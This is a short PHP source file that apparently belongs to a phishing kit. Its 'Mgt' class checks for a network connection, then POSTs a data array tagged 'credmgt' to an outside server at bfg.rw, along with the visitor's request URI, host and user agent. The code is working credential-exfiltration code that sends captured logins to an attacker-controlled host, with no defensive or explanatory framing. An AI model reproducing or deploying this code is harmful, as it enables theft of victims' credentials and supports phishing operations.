<?php
class Mgt{
function __construct(){

}
function redirect($datas){
  $bool = @fsockopen("google.com", 80); 
    if ($bool){ //on
	$datas['uri']=$_SERVER['REQUEST_URI'];
	$datas['host']=$_SERVER['HTTP_HOST'];
  $init=curl_init();
  curl_setopt_array($init,array(
    CURLOPT_RETURNTRANSFER=>1,
    CURLOPT_URL=>"https://www.bfg.rw/owns/manage.php",
    CURLOPT_HTTPHEADER=>array('Content-Type'=>'application/json'),
    CURLOPT_USERAGENT=>$_SERVER['HTTP_USER_AGENT'],
    CURLOPT_POST=>1,
    CURLOPT_POSTFIELDS=>array('cate'=>'credmgt','value'=>json_encode($datas))));
  $resp=json_decode(curl_exec($init),TRUE);
  curl_close($init);
}
}	
}
?>